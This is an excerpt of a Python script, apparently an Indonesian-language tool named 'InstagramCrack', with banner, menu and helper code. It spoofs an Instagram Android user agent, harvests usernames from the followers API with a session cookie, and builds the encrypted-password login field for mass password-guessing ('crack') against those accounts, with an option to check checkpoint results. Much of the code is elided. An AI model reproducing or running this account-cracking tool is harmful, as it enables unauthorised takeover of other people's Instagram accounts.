...
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU?
USN="Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Instagram 245.0.0.18.108 Android (29/10; 320dpi; 720x1449; Xiaomi/Redmi; M2006C3LG; dandelion; mt6762; es_US; 385416158)"
...
def banner():
	clear()
	cetak(nel(f"""[white]\t     .___  _________________  
\t     |   |/  _____/\_   ___ \ 
\t     |   /   \  ___/    \  \/ 
\t     |   \    \_\  \     \____  [bold cyan]InstagramCrack[white]
\t     |___|\______  /\______  /  Author [bold cyan]Ridwan-XD[white]
\t                 \/        \/   Update [bold cyan]14-8-2022[white]""",title=f"[white]{waktu()}",style="#00C8FF"))
    ...
    def logo(self):
        for i in external:
            try:
                ...
                pass
            banner()
            print(f'{N}[01]└── CRAK DARI PENCARIN NAME{M}(tidak di sarankan)\n{N}[02]└── CRAK DARI PENGIKUT{H} (disaran kan)\n{N}[03]└── CRAK DARI MENGIKUTI{M}(tidak di saran kan\n{N}[04] LAPOR BUG\n[05]└── CHEK OPSI CHEKPOINT\n[00] EXIT')
        ...
        if 'sukses' in  lisensiku:
            try:
                ...
                if 'pengikut' in menudump:
                    ...
                    for z in range (9999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=1000&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
...
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
    ...
    def menu(self):
        ...
        if c=='':
            ...
            mas=input(' └── SILAKAN ENTER UNTUK MELANJUTKAN CRAK ')
            if mas in ['t','T']:
                masal(self)
            elif mas in ['','']:
                massal(self)
